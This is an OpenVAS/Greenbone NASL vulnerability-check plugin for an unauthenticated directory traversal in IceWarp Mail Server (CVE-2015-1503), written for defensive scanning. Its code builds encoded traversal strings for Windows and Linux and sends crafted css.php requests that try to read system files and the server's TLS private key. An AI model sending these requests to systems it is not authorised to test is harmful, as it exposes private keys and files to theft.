CPE = "cpe:/a:icewarp:mail_server";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.114003" );
	script_version( "2021-05-27T06:00:15+0200" );
	script_tag( name: "last_modification", value: "2021-05-27 06:00:15 +0200 (Thu, 27 May 2021)" );
	script_tag( name: "creation_date", value: "2018-05-15 12:24:09 +0200 (Tue, 15 May 2018)" );
	script_cve_id( "CVE-2015-1503" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2018-06-12 18:03:00 +0000 (Tue, 12 Jun 2018)" );
	script_name( "IceWarp Mail Server < 11.2 Unauthenticated Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-001/?fid=5614" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/147505/IceWarp-Mail-Server-Directory-Traversal.html" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/44587/" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_icewarp_consolidation.sc", "os_detection.sc" );
	script_mandatory_keys( "icewarp/mailserver/http/detected" );
	script_tag( name: "impact", value: "Successful exploitation allows attackers to access restricted directories and
  execute commands outside of the web server's root directory." );
	script_tag( name: "affected", value: "IceWarp Mail Server prior to 11.2." );
	script_tag( name: "solution", value: "Upgrade to IceWarp Mail Server 11.2 or later. Please see the references for more information." );
	script_tag( name: "summary", value: "The host is running IceWarp Mail Server and is prone to unauthenticated directory traversal." );
	script_tag( name: "insight", value: "The unauthenticated Directory Traversal vulnerability can be exploited by issuing a specially crafted
  HTTP GET request to the /webmail/client/skins/default/css/css.php. Directory Traversal is a vulnerability which allows attackers to
  access restricted directories and execute commands outside of the web server's root directory.

  This vulnerability affects /-.._._.--.._1416610368(variable, depending on the installation, need to check page
  source)/webmail/client/skins/default/css/css.php." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
cache = http_get_cache( port: port, item: "/webmail/" );
if(!cache){
	exit( 0 );
}
regMatchedSpecificNumber = eregmatch( string: cache, pattern: "/\\-\\.\\._\\._\\.\\-\\-\\.\\._([0-9]+)/" );
if(isnull( regMatchedSpecificNumber[1] )){
	exit( 0 );
}
trav_files = traversal_files();
win_patterns = make_list( "/" + crap( data: "..\\",
	 length: 3 * 8 ),
	 "/" + crap( data: "%2e%2e%5c",
	 length: 9 * 8 ),
	 "/" + crap( data: "%2e%2e\\",
	 length: 7 * 8 ),
	 "/" + crap( data: "..%5c",
	 length: 5 * 8 ),
	 crap( data: "..\\",
	 length: 3 * 8 ),
	 crap( data: "%2e%2e%5c",
	 length: 9 * 8 ),
	 crap( data: "%2e%2e\\",
	 length: 7 * 8 ),
	 crap( data: "..%5c",
	 length: 5 * 8 ),
	 crap( data: "..\\",
	 length: 3 * 6 ),
	 "/" + crap( data: "..\\",
	 length: 3 * 6 ) );
lin_patterns = make_list( crap( data: "../",
	 length: 3 * 10 ),
	 "/" + crap( data: "../",
	 length: 3 * 10 ),
	 crap( data: "../",
	 length: 3 * 6 ),
	 "/" + crap( data: "../",
	 length: 3 * 6 ) );
if( os_host_runs( "windows" ) == "yes" ){
	trav_patterns = win_patterns;
	trav_files["-----BEGIN (RSA )?PRIVATE KEY----"] = "config\\cert.pem";
}
else {
	if( os_host_runs( "linux" ) == "yes" ){
		trav_patterns = lin_patterns;
		trav_files["-----BEGIN (RSA )?PRIVATE KEY-----"] = "config/cert.pem";
	}
	else {
		trav_patterns = make_list( win_patterns,
			 lin_patterns );
		trav_files["-----BEGIN (RSA )?PRIVATE KEY----"] = "config\\cert.pem";
		trav_files["-----BEGIN (RSA )?PRIVATE KEY-----"] = "config/cert.pem";
	}
}
for trav_pattern in trav_patterns {
	for trav_file in keys( trav_files ) {
		url = "/-.._._.--.._" + regMatchedSpecificNumber[1] + "/webmail/client/skins/default/css/css.php?file=" + trav_pattern + trav_files[trav_file] + "&palette=default&skin=default";
		if(http_vuln_check( port: port, url: url, pattern: trav_file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

